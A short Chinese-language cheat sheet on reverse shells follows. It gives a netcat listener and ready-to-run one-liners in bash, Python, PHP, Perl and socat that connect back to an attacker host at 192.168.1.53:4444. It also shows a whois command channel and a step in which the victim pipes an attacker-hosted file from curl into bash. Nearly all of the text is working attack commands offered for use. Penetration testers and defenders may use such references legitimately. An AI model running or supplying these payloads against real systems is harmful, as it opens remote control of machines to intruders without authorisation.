ShellCode 是指一段小型的机器代码，通常用于在计算机系统中执行特定的恶意操作。

## 1 监听端口

Netcat 侦听端口用于接收反弹 `shell`

```shell
┌──(root㉿kali)-[~]
└─# nc -lnvp [port]
```

## 2 反弹 Shell

**Bash**

```shell
[root@centos ~]# bash -i >& /dev/tcp/[host]/[port] 0>&1
```

**Curl 反弹**
开启 Web 服务

```shell
┌──(root㉿kali)-[~]
└─#  systemctl start apache2.service
```

将反弹 Shell 写入 HTML 文件

```shell
┌──(root㉿kali)-[/var/www/html]
└─# vim bash.html   
```

```
bash -i >& /dev/tcp/192.168.1.53/4444 0>&1
```

受害者下载并运行攻击者的文件

```
[root@centos ~]# curl 192.168.1.53/bash.html | bash
```

**Whois 反弹**

下载 `whois` 

```
[root@centos ~]# yum install -y whois
```

反弹的 Shell 并执行命令

```
[root@centos ~]# whois -h 192.168.1.53 -p 4444 [command]
```

**Python 反弹**

```
[root@centos ~]# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.53",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP 反弹**

安装 `php`

```
[root@centos ~]# yum install php -y
```

反弹 Shell

```
[root@centos ~]# php -r '$sock=fsockopen("192.168.1.53",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Socat 反弹**

安装 `socat`

```
[root@centos ~]# yum install -y socat
```

反弹 Shell

```
[root@centos ~]# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.53:4444
```

**Perl 反弹**

```
[root@centos ~]# perl -e 'use Socket;$i="192.168.1.53";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

参考链接

- [Reverse Shell Generator](https://www.revshells.com/)
